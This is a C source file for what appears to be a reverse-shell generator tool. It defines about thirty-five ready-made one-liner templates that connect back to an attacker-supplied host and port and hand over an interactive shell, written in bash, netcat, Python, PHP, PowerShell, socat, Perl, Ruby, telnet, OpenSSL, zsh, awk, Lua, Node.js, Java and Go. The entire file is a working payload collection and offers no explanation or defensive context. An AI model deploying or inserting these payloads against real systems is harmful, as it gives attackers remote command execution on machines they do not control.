#include "templates.h"
#include <string.h>

void initialize_templates(ShellTemplate *templates, int *count) {
    int i = 0;

    // === BASH SHELLS ===
    strcpy(templates[i].name, "bash-i");
    strcpy(templates[i].description, "Bash -i classic TCP reverse shell");
    strcpy(templates[i].template, "bash -i >& /dev/tcp/%s/%d 0>&1");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "bash-196");
    strcpy(templates[i].description, "Bash with file descriptor 196");
    strcpy(templates[i].template, "0<&196;exec 196<>/dev/tcp/%s/%d; bash <&196 >&196 2>&196");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "bash-readline");
    strcpy(templates[i].description, "Bash read line with exec");
    strcpy(templates[i].template, "exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do $line 2>&5 >&5; done");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "bash-5");
    strcpy(templates[i].description, "Bash with fd 5");
    strcpy(templates[i].template, "bash -i 5<> /dev/tcp/%s/%d 0<&5 1>&5 2>&5");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "bash-udp");
    strcpy(templates[i].description, "Bash UDP reverse shell");
    strcpy(templates[i].template, "bash -i >& /dev/udp/%s/%d 0>&1");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    // === NETCAT SHELLS ===
    strcpy(templates[i].name, "nc-mkfifo");
    strcpy(templates[i].description, "Netcat with mkfifo (no -e required)");
    strcpy(templates[i].template, "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "nc-e");
    strcpy(templates[i].description, "Netcat with -e option");
    strcpy(templates[i].template, "nc -e /bin/sh %s %d");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "nc-exe");
    strcpy(templates[i].description, "Windows netcat with -e");
    strcpy(templates[i].template, "nc.exe %s %d -e cmd.exe");
    strcpy(templates[i].meta, "windows");
    i++;

    strcpy(templates[i].name, "nc-c");
    strcpy(templates[i].description, "Netcat with -c option");
    strcpy(templates[i].template, "nc -c /bin/sh %s %d");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "busybox-nc");
    strcpy(templates[i].description, "BusyBox netcat");
    strcpy(templates[i].template, "busybox nc %s %d -e /bin/sh");
    strcpy(templates[i].meta, "linux");
    i++;

    // === PYTHON SHELLS ===
    strcpy(templates[i].name, "python-pty");
    strcpy(templates[i].description, "Python with pty for TTY");
    strcpy(templates[i].template, "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "python3");
    strcpy(templates[i].description, "Python3 reverse shell");
    strcpy(templates[i].template, "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "python-short");
    strcpy(templates[i].description, "Python shortest version");
    strcpy(templates[i].template, "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%d));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'");
    strcpy(templates[i].meta, "linux");
    i++;

    // === PHP SHELLS ===
    strcpy(templates[i].name, "php-exec");
    strcpy(templates[i].description, "PHP exec function");
    strcpy(templates[i].template, "php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "php-system");
    strcpy(templates[i].description, "PHP system function");
    strcpy(templates[i].template, "php -r '$sock=fsockopen(\"%s\",%d);system(\"/bin/sh -i <&3 >&3 2>&3\");'");
    strcpy(templates[i].meta, "linux,windows,mac");
    i++;

    strcpy(templates[i].name, "php-shell-exec");
    strcpy(templates[i].description, "PHP shell_exec function");
    strcpy(templates[i].template, "php -r '$sock=fsockopen(\"%s\",%d);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "php-passthru");
    strcpy(templates[i].description, "PHP passthru function");
    strcpy(templates[i].template, "php -r '$sock=fsockopen(\"%s\",%d);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "php-proc-open");
    strcpy(templates[i].description, "PHP proc_open function");
    strcpy(templates[i].template, "php -r '$sock=fsockopen(\"%s\",%d);$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'");
    strcpy(templates[i].meta, "linux,windows,mac");
    i++;

    // === POWERSHELL SHELLS ===
    strcpy(templates[i].name, "powershell-tcp");
    strcpy(templates[i].description, "PowerShell TCP client");
    strcpy(templates[i].template, "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
    strcpy(templates[i].meta, "windows");
    i++;

    strcpy(templates[i].name, "powershell-2");
    strcpy(templates[i].description, "PowerShell alternative");
    strcpy(templates[i].template, "$LHOST = \"%s\"; $LPORT = %d; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()");
    strcpy(templates[i].meta, "windows");
    i++;

    // === SOCAT ===
    strcpy(templates[i].name, "socat-tty");
    strcpy(templates[i].description, "Socat with full TTY");
    strcpy(templates[i].template, "socat TCP:%s:%d EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "socat-simple");
    strcpy(templates[i].description, "Socat simple");
    strcpy(templates[i].template, "socat TCP:%s:%d EXEC:/bin/sh");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    // === PERL ===
    strcpy(templates[i].name, "perl");
    strcpy(templates[i].description, "Perl reverse shell");
    strcpy(templates[i].template, "perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "perl-nosh");
    strcpy(templates[i].description, "Perl no sh");
    strcpy(templates[i].template, "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"%s:%d\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    // === RUBY ===
    strcpy(templates[i].name, "ruby");
    strcpy(templates[i].description, "Ruby reverse shell");
    strcpy(templates[i].template, "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))'");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    strcpy(templates[i].name, "ruby-nosh");
    strcpy(templates[i].description, "Ruby no sh");
    strcpy(templates[i].template, "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"%s\",\"%d\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    // === TELNET ===
    strcpy(templates[i].name, "telnet");
    strcpy(templates[i].description, "Telnet reverse shell");
    strcpy(templates[i].template, "TF=$(mktemp -u);mkfifo $TF && telnet %s %d 0<$TF | /bin/sh 1>$TF");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    // === OPENSSL ===
    strcpy(templates[i].name, "openssl");
    strcpy(templates[i].description, "OpenSSL encrypted shell");
    strcpy(templates[i].template, "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect %s:%d > /tmp/s; rm /tmp/s");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    // === ZSH ===
    strcpy(templates[i].name, "zsh");
    strcpy(templates[i].description, "Zsh built-in TCP");
    strcpy(templates[i].template, "zsh -c 'zmodload zsh/net/tcp && ztcp %s %d && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    // === AWK ===
    strcpy(templates[i].name, "awk");
    strcpy(templates[i].description, "Awk reverse shell");
    strcpy(templates[i].template, "awk 'BEGIN {s = \"/inet/tcp/0/%s/%d\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    // === LUA ===
    strcpy(templates[i].name, "lua");
    strcpy(templates[i].description, "Lua reverse shell");
    strcpy(templates[i].template, "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('%s','%d');os.execute('/bin/sh -i <&3 >&3 2>&3');\"");
    strcpy(templates[i].meta, "linux");
    i++;

    // === NODE.JS ===
    strcpy(templates[i].name, "nodejs");
    strcpy(templates[i].description, "Node.js reverse shell");
    strcpy(templates[i].template, "require('child_process').exec('nc -e /bin/sh %s %d')");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    // === JAVA ===
    strcpy(templates[i].name, "java");
    strcpy(templates[i].description, "Java reverse shell");
    strcpy(templates[i].template, "public class shell { public static void main(String[] args) { Process p; try { p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/%s/%d 0>&1\"); p.waitFor(); p.destroy(); } catch (Exception e) {} } }");
    strcpy(templates[i].meta, "linux,mac");
    i++;

    // === GOLANG ===
    strcpy(templates[i].name, "golang");
    strcpy(templates[i].description, "Go reverse shell");
    strcpy(templates[i].template, "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"%s:%d\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go");
    strcpy(templates[i].meta, "linux,mac,windows");
    i++;


    *count = i;
}